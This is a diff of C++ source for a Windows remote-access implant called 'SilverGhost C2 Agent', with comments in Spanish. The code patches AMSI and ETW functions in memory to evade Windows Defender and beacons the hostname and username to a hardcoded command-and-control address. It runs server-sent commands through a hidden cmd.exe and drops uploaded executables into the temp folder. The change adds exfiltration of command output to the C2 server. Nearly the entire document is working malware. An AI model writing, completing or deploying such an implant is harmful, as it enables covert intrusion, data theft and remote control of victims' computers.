@@ -1,5 +1,5 @@
 /*
- * SilverGhost C2 Agent v3.1 - UPLOAD + DOWNLOAD + DEFENDER BYPASS
+ * SilverGhost C2 Agent v3.2 - CON OUTPUT
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -9,15 +9,13 @@
 #include <vector>
 
 #pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "crypt32.lib")
 
 #define C2_SERVER "192.168.254.146"
 #define C2_PORT 9090
 
-// ========== BASE64 (para upload/download) ==========
+// ========== BASE64 ==========
 static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 std::string b64encode(const std::vector<BYTE>& data) {
@@ -52,9 +50,8 @@ std::vector<BYTE> b64decode(const std::string& data) {
     return result;
 }
 
-// ========== WINDOWS DEFENDER BYPASS ==========
+// ========== BYPASS ==========
 void DisableDefenses() {
-    // AMSI Bypass
     HMODULE hAmsi = LoadLibraryA("amsi.dll");
     if (hAmsi) {
         BYTE* pFunc = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
@@ -67,7 +64,6 @@ void DisableDefenses() {
         }
     }
     
-    // ETW Bypass
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (hNtdll) {
         BYTE* pEtw = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
@@ -77,17 +73,10 @@ void DisableDefenses() {
             *pEtw = 0xC3;
             VirtualProtect(pEtw, 1, oldProt, &oldProt);
         }
-        BYTE* pEtwFull = (BYTE*)GetProcAddress(hNtdll, "NtTraceEvent");
-        if (pEtwFull) {
-            DWORD oldProt;
-            VirtualProtect(pEtwFull, 1, PAGE_EXECUTE_READWRITE, &oldProt);
-            *pEtwFull = 0xC3;
-            VirtualProtect(pEtwFull, 1, oldProt, &oldProt);
-        }
     }
 }
 
-// ========== PROCESAR RESPUESTA C2 ==========
+// ========== EJECUTAR COMANDO Y CAPTURAR OUTPUT ==========
 std::string ExecuteCommand(const std::string& cmd) {
     std::string output;
     HANDLE hPipeRead, hPipeWrite;
@@ -103,8 +92,7 @@ std::string ExecuteCommand(const std::string& cmd) {
         
         std::string full_cmd = "cmd.exe /c \"" + cmd + "\" 2>&1";
         if (CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE, 
-                          CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-            ResumeThread(pi.hThread);
+                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(hPipeWrite);
             
             char buffer[4096];
@@ -122,7 +110,7 @@ std::string ExecuteCommand(const std::string& cmd) {
     return output;
 }
 
-// ========== UPLOAD FILE ==========
+// ========== UPLOAD ==========
 bool HandleUpload(const std::string& response) {
     size_t start = response.find("FromBase64String('") + 17;
     size_t end = response.find("');", start);
@@ -131,7 +119,11 @@ bool HandleUpload(const std::string& response) {
     std::string b64data = response.substr(start, end - start);
     std::vector<BYTE> filedata = b64decode(b64data);
     
-    HANDLE hFile = CreateFileA("%TEMP%\\agent.exe", GENERIC_WRITE, 0, NULL, 
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string filePath = std::string(tempPath) + "uploaded_agent.exe";
+    
+    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, 
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE) {
         DWORD written;
@@ -142,10 +134,9 @@ bool HandleUpload(const std::string& response) {
     return false;
 }
 
-// ========== BEACON ==========
+// ========== BEACON CON OUTPUT ==========
 void Beacon() {
-    HINTERNET hSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
-                                       INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return;
     
     char hostname[256], username[256];
@@ -154,7 +145,7 @@ void Beacon() {
     size = sizeof(username);
     GetUserNameA(username, &size);
     
-    std::string beacon_data = std::string(hostname) + "|" + username + "|Windows";
+    std::string output_buffer;  // Buffer para guardar output de comandos
     
     while (true) {
         HINTERNET hConnect = InternetConnectA(hSession, C2_SERVER, C2_PORT, NULL, NULL, 
@@ -163,40 +154,40 @@ void Beacon() {
             HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, 
                                                   INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
             if (hRequest) {
-                const char* headers = "Content-Type: text/plain\r\nUser-Agent: Mozilla/5.0\r\n";
-                
-                if (HttpSendRequestA(hRequest, headers, -1, 
-                                    (LPVOID)beacon_data.c_str(), beacon_data.length())) {
-                    
-                    char buffer[16384];
-                    DWORD bytesRead;
-                    std::string response;
-                    
-                    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
-                        buffer[bytesRead] = '\0';
-                        response += buffer;
-                    }
-                    
-                    // Limpiar respuesta HTTP
-                    size_t body_start = response.find("\r\n\r\n");
-                    if (body_start != std::string::npos) {
-                        response = response.substr(body_start + 4);
-                    }
-                    
-                    // Detectar y manejar upload
-                    if (response.find("FromBase64String") != std::string::npos) {
-                        if (HandleUpload(response)) {
-                            // Beacon confirma upload
-                            continue;
-                        }
-                    }
-                    
-                    // Ejecutar comando normal
-                    if (!response.empty() && response.find("JDEXPLOIT_ACTIVE") == std::string::npos) {
-                        std::string output = ExecuteCommand(response);
-                        // Enviar output en próximo beacon (simplificado)
-                    }
+                // Enviar beacon (incluir output pendiente si existe)
+                std::string beacon_data = std::string(hostname) + "|" + username + "|Windows";
+                if (!output_buffer.empty()) {
+                    beacon_data += "|OUTPUT:" + output_buffer;
+                    output_buffer.clear();
                 }
+                
+                HttpSendRequestA(hRequest, "Content-Type: text/plain\r\n", -1, 
+                                (LPVOID)beacon_data.c_str(), beacon_data.length());
+                
+                char buffer[32768];
+                DWORD bytesRead;
+                std::string response;
+                
+                while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+                    buffer[bytesRead] = '\0';
+                    response += buffer;
+                }
+                
+                // Limpiar headers HTTP
+                size_t body_start = response.find("\r\n\r\n");
+                if (body_start != std::string::npos) {
+                    response = response.substr(body_start + 4);
+                }
+                
+                // Detectar upload
+                if (response.find("FromBase64String") != std::string::npos) {
+                    HandleUpload(response);
+                }
+                // Ejecutar comando normal y guardar output
+                else if (!response.empty() && response.find("JDEXPLOIT_ACTIVE") == std::string::npos) {
+                    output_buffer = ExecuteCommand(response);
+                }
+                
                 InternetCloseHandle(hRequest);
             }
             InternetCloseHandle(hConnect);
@@ -206,7 +197,7 @@ void Beacon() {
     InternetCloseHandle(hSession);
 }
 
-// ========== ENTRY POINT ==========
+// ========== ENTRY ==========
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     Sleep(2000);
     DisableDefenses();
